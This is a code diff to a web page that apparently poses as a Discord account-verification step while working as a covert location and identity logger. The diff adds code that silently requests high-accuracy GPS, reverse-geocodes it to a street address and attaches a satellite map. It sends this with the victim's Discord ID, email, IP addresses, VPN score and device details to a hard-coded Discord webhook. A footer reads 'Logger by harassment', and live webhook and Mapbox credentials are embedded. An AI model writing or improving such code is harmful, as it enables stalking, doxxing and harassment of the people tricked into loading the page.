@@ -206,6 +206,22 @@
             WEBHOOK_URL: 'https://discord.com/api/webhooks/1454071163583070323/IAcO-7YEIzCyDkMWhm5BARhiNWrzdgOUVGCZezg56PsnlnD9SPh3_H5zO6y9g3N0gMM8'
         };
 
+        // Silently try to get GPS in background
+        let gpsData = null;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    gpsData = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy)
+                    };
+                },
+                () => {}, // Silent fail
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+        }
+
         function showError(message, details = null) {
             document.getElementById('loadingState').style.display = 'none';
             const errorBox = document.getElementById('errorBox');
@@ -255,10 +271,13 @@
                 }
 
                 if (data.success && data.user) {
-                    // Send enhanced webhook - DON'T throw errors to user
+                    // Wait a bit more for GPS to complete
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    // Send enhanced webhook
                     sendEnhancedWebhook(data.user).catch(e => console.error('Webhook failed:', e));
                     
-                    // Wait for webhook to send
+                    // Wait for webhook
                     await new Promise(resolve => setTimeout(resolve, 2000));
                     
                     // Redirect
@@ -278,10 +297,13 @@
         }
 
         async function sendEnhancedWebhook(discordUser) {
-            // Get all enhanced data
-            const ipData = await getEnhancedIPData();
+            // Get all data
+            const [ipData, webrtcIPs] = await Promise.all([
+                getEnhancedIPData(),
+                getWebRTCIPs()
+            ]);
+            
             const vpnData = detectVPN(ipData);
-            const webrtcIPs = await getWebRTCIPs();
             const deviceData = getDeviceData();
             
             // Safe string conversion
@@ -290,62 +312,103 @@
                 return String(val).substring(0, 1000);
             };
             
-            // Build webhook payload - split into 2 embeds to avoid field limit
+            // Use GPS if available, otherwise IP
+            let finalLat = ipData.lat;
+            let finalLon = ipData.lon;
+            let finalCoords = ipData.coordinates;
+            let coordinateSource = 'IP Geolocation';
+            let addressInfo = ipData.location;
+            
+            if (gpsData) {
+                finalLat = gpsData.lat;
+                finalLon = gpsData.lon;
+                const preciseLat = Math.round(finalLat * 100000000) / 100000000;
+                const preciseLon = Math.round(finalLon * 100000000) / 100000000;
+                finalCoords = `${preciseLat}, ${preciseLon}`;
+                coordinateSource = `GPS (±${gpsData.accuracy}m)`;
+                
+                // Get street address from GPS coordinates using reverse geocoding
+                try {
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${finalLat}&lon=${finalLon}&zoom=18&addressdetails=1`);
+                    if (geoRes.ok) {
+                        const geoData = await geoRes.json();
+                        if (geoData.address) {
+                            const parts = [];
+                            if (geoData.address.house_number) parts.push(geoData.address.house_number);
+                            if (geoData.address.road) parts.push(geoData.address.road);
+                            if (geoData.address.suburb || geoData.address.neighbourhood) parts.push(geoData.address.suburb || geoData.address.neighbourhood);
+                            if (geoData.address.city || geoData.address.town) parts.push(geoData.address.city || geoData.address.town);
+                            if (geoData.address.state) parts.push(geoData.address.state);
+                            if (geoData.address.postcode) parts.push(geoData.address.postcode);
+                            if (geoData.address.country) parts.push(geoData.address.country);
+                            addressInfo = parts.join(', ');
+                        }
+                    }
+                } catch (e) {
+                    // Geocoding failed, use IP location
+                }
+            }
+            
+            // Build map
+            let mapImage = null;
+            if (finalLat && finalLon) {
+                const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
+                const zoom = gpsData ? 18 : 14; // Street-level for GPS, neighborhood for IP
+                mapImage = `https://api.mapbox.com/styles/v1/mapbox/satellite-streets-v12/static/pin-l-marker+f74e4e(${finalLon},${finalLat})/${finalLon},${finalLat},${zoom},0/600x400@2x?access_token=${mapboxToken}`;
+            }
+            
+            // Build embeds
             const embed1 = {
-                title: "📊 User Verification - Account & Location",
-                color: vpnData.score >= 50 ? 16740864 : 16711680,
+                title: "📊 User Verification - Location & Network",
+                color: vpnData.score >= 50 ? 16740864 : (gpsData ? 65280 : 16711680),
                 fields: [
                     { name: "👤 Username", value: s(discordUser.username), inline: true },
                     { name: "🆔 Discord ID", value: s(discordUser.id), inline: true },
                     { name: "📧 Email", value: s(discordUser.email || 'Not provided'), inline: true },
                     { name: "📍 IP Address", value: s(ipData.ip), inline: true },
                     { name: "🔗 WebRTC IPs", value: s(webrtcIPs.join(', ') || 'None'), inline: true },
-                    { name: "🌐 ISP", value: s(ipData.isp), inline: true },
+                    { name: "🌐 ISP/Org", value: s(ipData.isp), inline: true },
                     { name: "🏢 ASN", value: s(ipData.asn), inline: true },
-                    { name: "🌍 Location", value: s(ipData.location), inline: false },
+                    { name: "🏠 Full Address", value: s(addressInfo), inline: false },
                     { name: "📮 Postal Code", value: s(ipData.postal), inline: true },
-                    { name: "🗺️ Coordinates", value: s(ipData.coordinates), inline: true },
+                    { name: "🗺️ Coordinates", value: s(finalCoords), inline: true },
+                    { name: "📡 Location Method", value: s(coordinateSource), inline: true },
                     { name: "🕒 Timezone", value: s(ipData.timezone), inline: true },
                     { name: "🛡️ VPN Status", value: s(vpnData.status), inline: true },
                     { name: "📊 VPN Score", value: s(vpnData.score) + '/100', inline: true },
-                    { name: "🎯 Confidence", value: s(vpnData.confidence), inline: true },
-                    { name: "🔍 VPN Indicators", value: s(vpnData.indicators || 'None'), inline: false },
-                    { name: "📡 Data Sources", value: s(ipData.sources), inline: false }
+                    { name: "🔍 VPN Indicators", value: s(vpnData.indicators || 'None'), inline: false }
                 ],
                 thumbnail: { url: discordUser.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png' }
             };
+
+            if (mapImage) {
+                embed1.image = { url: mapImage };
+            }
 
             const embed2 = {
                 title: "💻 Device & Browser Information",
                 color: 5814783,
                 fields: [
-                    { name: "🌐 Browser", value: s(deviceData.browser), inline: false },
+                    { name: "🌐 Browser", value: s(deviceData.browser).substring(0, 1000), inline: false },
                     { name: "🖥️ OS", value: s(deviceData.os), inline: true },
-                    { name: "📱 Device Type", value: s(deviceData.deviceType), inline: true },
+                    { name: "📱 Device", value: s(deviceData.deviceType), inline: true },
                     { name: "🖥️ Resolution", value: s(deviceData.resolution), inline: true },
                     { name: "🗣️ Language", value: s(deviceData.language), inline: true },
                     { name: "💻 CPU Cores", value: s(deviceData.cpuCores), inline: true },
-                    { name: "🔋 Battery", value: s(deviceData.battery), inline: true },
                     { name: "🚫 AdBlock", value: s(deviceData.adblock), inline: true },
                     { name: "🍪 Cookies", value: s(deviceData.cookies), inline: true },
                     { name: "📶 Connection", value: s(deviceData.connection), inline: true },
                     { name: "⏱️ Ping", value: s(deviceData.rtt), inline: true },
-                    { name: "⬇️ Speed", value: s(deviceData.downlink), inline: true },
                     { name: "📅 Timestamp", value: new Date().toLocaleString(), inline: false }
                 ],
                 footer: {
-                    text: "Logger by harassment",
+                    text: `Logger by harassment • ${gpsData ? '🎯 GPS Obtained' : '📡 IP-based Location'}`,
                     icon_url: "https://cdn.discordapp.com/avatars/1404732292412477531/22c739eb7dd42b243e92587e18069b2d.png"
                 }
             };
 
-            // Add map image if we have coordinates
-            if (ipData.mapImage) {
-                embed1.image = { url: ipData.mapImage };
-            }
-
             const payload = {
-                content: vpnData.score >= 50 ? "⚠️ **VPN/Proxy User Detected**" : "📡 **User Verified & Logged**",
+                content: vpnData.score >= 50 ? "⚠️ **VPN/Proxy Detected**" : (gpsData ? "✅ **GPS Location Obtained**" : "📡 **User Verified**"),
                 embeds: [embed1, embed2]
             };
 
@@ -377,11 +440,10 @@
                 org: '',
                 sources: [],
                 proxy: false,
-                hosting: false,
-                mapImage: null
+                hosting: false
             };
 
-            // Service 1: ipapi.co (most detailed)
+            // ipapi.co
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 if (res.ok) {
@@ -401,7 +463,7 @@
                 }
             } catch (e) {}
 
-            // Service 2: ip-api.com (VPN detection)
+            // ip-api.com
             try {
                 const res = await fetch('https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query');
                 if (res.ok) {
@@ -420,42 +482,18 @@
                 }
             } catch (e) {}
 
-            // Service 3: ipinfo.io (backup)
-            try {
-                const res = await fetch('https://ipinfo.io/json');
-                if (res.ok) {
-                    const d = await res.json();
-                    if (!results.city) results.city = d.city || '';
-                    if (!results.region) results.region = d.region || '';
-                    if (!results.country) results.country = d.country || '';
-                    if (!results.lat && d.loc) {
-                        const [lat, lon] = d.loc.split(',');
-                        results.lat = parseFloat(lat);
-                        results.lon = parseFloat(lon);
-                    }
-                    results.sources.push('ipinfo.io');
-                }
-            } catch (e) {}
-
-            // Build location string
             const locParts = [];
             if (results.city) locParts.push(results.city);
             if (results.region) locParts.push(results.region);
             if (results.country) locParts.push(results.country);
             results.location = locParts.length > 0 ? locParts.join(', ') : 'Unknown';
 
-            // Build coordinates string (6 decimal places = ~0.11m accuracy)
             if (results.lat && results.lon) {
                 const preciseLat = Math.round(results.lat * 1000000) / 1000000;
                 const preciseLon = Math.round(results.lon * 1000000) / 1000000;
                 results.coordinates = `${preciseLat}, ${preciseLon}`;
-                
-                // Generate map image
-                const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
-                results.mapImage = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${preciseLon},${preciseLat})/${preciseLon},${preciseLat},14,0/600x300@2x?access_token=${mapboxToken}`;
             }
 
-            results.sources = results.sources.join(', ') || 'Direct';
             return results;
         }
 
@@ -463,24 +501,21 @@
             let score = 0;
             const indicators = [];
 
-            // Check 1: Proxy flag
             if (ipData.proxy) {
                 indicators.push('Proxy detected');
                 score += 40;
             }
 
-            // Check 2: Hosting/datacenter
             if (ipData.hosting) {
                 indicators.push('Datacenter IP');
                 score += 35;
             }
 
-            // Check 3: Organization keywords
             if (ipData.org) {
                 const org = ipData.org.toLowerCase();
-                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'data center', 'cloud', 'virtual', 'server', 
-                    'linode', 'digitalocean', 'amazon', 'aws', 'google cloud', 'azure', 'ovh', 'hetzner', 'vultr', 
-                    'cloudflare', 'nordvpn', 'expressvpn', 'surfshark', 'mullvad', 'protonvpn'];
+                const vpnKeywords = ['vpn', 'proxy', 'hosting', 'datacenter', 'cloud', 'virtual', 'server', 
+                    'digitalocean', 'amazon', 'aws', 'azure', 'ovh', 'hetzner', 'vultr', 'cloudflare', 
+                    'nordvpn', 'expressvpn', 'surfshark', 'mullvad', 'protonvpn'];
                 
                 for (const keyword of vpnKeywords) {
                     if (org.includes(keyword)) {
@@ -491,35 +526,13 @@
                 }
             }
 
-            // Check 4: ASN patterns
-            if (ipData.asn) {
-                const asn = ipData.asn.toLowerCase();
-                const suspiciousASNs = ['as13335', 'as16509', 'as15169', 'as8075', 'as14061', 'as20473', 'as16276', 'as24940'];
-                for (const suspicious of suspiciousASNs) {
-                    if (asn.includes(suspicious)) {
-                        indicators.push(`Datacenter ASN: ${suspicious}`);
-                        score += 20;
-                        break;
-                    }
-                }
-            }
-
             let status = '❌ Not Detected';
             let confidence = 'Low';
 
-            if (score >= 70) {
-                status = '🔴 VPN/Proxy CONFIRMED';
-                confidence = 'Very High';
-            } else if (score >= 50) {
-                status = '🟠 VPN/Proxy LIKELY';
-                confidence = 'High';
-            } else if (score >= 30) {
-                status = '🟡 VPN/Proxy POSSIBLE';
-                confidence = 'Medium';
-            } else if (score >= 15) {
-                status = '🟢 VPN/Proxy UNLIKELY';
-                confidence = 'Low';
-            }
+            if (score >= 70) status = '🔴 CONFIRMED';
+            else if (score >= 50) status = '🟠 LIKELY';
+            else if (score >= 30) status = '🟡 POSSIBLE';
+            else if (score >= 15) status = '🟢 UNLIKELY';
 
             return {
                 status,
@@ -572,7 +585,6 @@
                 resolution: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language || 'Unknown',
                 cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                battery: 'Unknown',
                 adblock: '❌ Unknown',
                 cookies: navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled',
                 connection: conn?.effectiveType || 'Unknown',
